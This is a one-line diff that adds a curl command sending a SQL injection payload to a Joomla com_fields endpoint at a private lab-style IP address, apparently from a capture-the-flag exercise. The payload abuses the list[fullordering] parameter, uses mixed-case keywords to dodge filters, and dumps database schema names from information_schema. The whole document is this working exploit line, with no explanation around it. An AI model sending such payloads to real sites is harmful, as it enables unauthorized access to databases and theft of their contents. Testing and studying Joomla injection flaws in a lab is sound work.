@@ -1,0 +1,1 @@
+curl 'http://10.10.23.240/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=A and (1,2,3,4) = (Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata UNION SELECT 1,2,3,4 LIMIT 1)'
